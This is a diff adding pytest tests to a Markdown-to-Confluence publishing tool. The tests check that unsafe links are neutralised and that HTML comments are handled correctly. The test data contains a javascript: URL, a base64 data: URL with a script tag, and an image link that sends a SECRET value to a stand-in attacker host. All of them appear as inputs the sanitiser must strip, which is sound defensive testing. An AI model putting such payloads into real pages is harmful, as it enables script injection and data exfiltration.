@@ -1042,3 +1042,28 @@ def test_main_refuses_agent(vault_pages, mock_confluence, monkeypatch):
     with pytest.raises(core.PolicyRefused):
         confluence_push.main(["--root", str(vault_pages)])
     assert mock_confluence.log == []
+
+
+def test_unsafe_links_and_external_images_become_text():
+    resolver = confluence_push.LinkResolver({"wiki/topics/캐시.md": "[KB] 캐시"}, "http://127.0.0.1:1")
+    md = (
+        "[safe](https://example.com) "
+        "[mail](mailto:user@example.com) "
+        "[js](javascript:alert(1)) "
+        "[data](data:text/html;base64,PHNjcmlwdD4=) "
+        "![alt-text](https://attacker.example/c?d=SECRET)\n"
+    )
+    out = confluence_push.to_storage(md, resolver)
+    assert 'href="https://example.com"' in out
+    assert 'href="mailto:user@example.com"' in out
+    assert "javascript:" not in out and "data:" not in out
+    assert "js" in out and "data" in out
+    assert "<img" not in out and "attacker.example" not in out and "alt-text" in out
+
+
+def test_comments_in_code_are_kept():
+    md = "# Title\n\n<!-- strip me -->\n\n```markdown\n<!-- example marker -->\nhello\n```\n\ninline `<!-- keep -->` code\n"
+    doc = confluence_push.prepare("wiki/topics/demo.md", md.encode("utf-8"), "[KB] ")
+    assert "<!-- strip me -->" not in doc.body
+    assert "<!-- example marker -->" in doc.body
+    assert "`<!-- keep -->`" in doc.body
